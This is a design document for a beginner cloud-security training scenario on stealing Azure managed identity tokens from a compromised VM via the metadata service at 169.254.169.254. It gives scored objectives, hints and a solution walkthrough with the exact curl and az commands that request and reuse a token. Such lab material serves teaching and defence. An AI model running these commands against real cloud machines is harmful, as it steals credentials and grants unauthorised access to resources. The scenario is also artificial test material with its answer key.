# Scenario 02: IMDS Token Theft

**Status:** Planned
**Difficulty:** Beginner
**Estimated Time:** 15-20 minutes

## Overview

Players exploit the Azure Instance Metadata Service (IMDS) from a compromised virtual machine to steal managed identity tokens and access Azure resources.

## Learning Objectives

- Understand Azure Instance Metadata Service (IMDS)
- Learn how managed identities work in Azure
- Recognize the risks of compromised VMs with managed identities
- Understand token-based authentication in Azure

## Attack Narrative

You've gained initial access to a virtual machine in Azure through a web application vulnerability. The VM appears to have a managed identity attached. Your objective is to extract the managed identity token and use it to enumerate what resources you can access.

## Starting Intel

- Access: Shell on compromised VM `web-server-01`
- VM has system-assigned managed identity
- IMDS endpoint: `169.254.169.254`

## Resources

### Virtual Machine: web-server-01
- Resource Group: production-rg
- Location: eastus
- Identity: System-assigned managed identity
- Permissions: Reader on subscription, Contributor on storage

### IMDS Endpoints
- Instance metadata: `/metadata/instance`
- Identity token: `/metadata/identity/oauth2/token`

## Objectives

| Order | ID | Description | Trigger | Points |
|-------|-----|-------------|---------|--------|
| 1 | query_imds | Query IMDS to discover VM metadata | `curl.*169.254.169.254.*metadata/instance` | 50 |
| 2 | discover_identity | Discover the managed identity configuration | `curl.*169.254.169.254.*identity` | 75 |
| 3 | steal_token | Extract an access token for the managed identity | `curl.*169.254.169.254.*oauth2/token` | 100 |
| 4 | use_token | Use the stolen token to access Azure resources | `az.*--access-token` | 150 |

**Total Points:** 375

## Hints

### query_imds
- Level 1 (10 pts): "Azure VMs have a metadata service at a special IP address..."
- Level 2 (25 pts): "curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01"

### discover_identity
- Level 1 (15 pts): "The IMDS can tell you about the VM's identity configuration"
- Level 2 (35 pts): "Try querying the identity endpoint at /metadata/identity"

### steal_token
- Level 1 (20 pts): "Managed identities can request OAuth tokens from IMDS"
- Level 2 (50 pts): "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

### use_token
- Level 1 (25 pts): "Azure CLI can use access tokens directly with the --access-token flag"
- Level 2 (50 pts): "az account get-access-token returns tokens; az commands accept --access-token"

## Solution Walkthrough

```bash
# Step 1: Query instance metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Step 2: Check identity configuration
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity?api-version=2018-02-01"

# Step 3: Request an access token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Step 4: Use the token
az account show --access-token <token>
az storage account list --access-token <token>
```

## Debrief Topics

- Azure Instance Metadata Service (IMDS) security
- Managed identity types (system vs user-assigned)
- Token lifetime and refresh
- Network restrictions for IMDS access
- Principle of least privilege for managed identities
- Monitoring managed identity token requests

## Real-World References

- MITRE ATT&CK: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
- Azure Security: Managed identity best practices
- Microsoft Defender for Cloud: VM vulnerability recommendations

## Implementation Notes

Requires:
- Mocked IMDS endpoints in CLI parser
- VM resource with identity configuration
- Token generation/validation mock
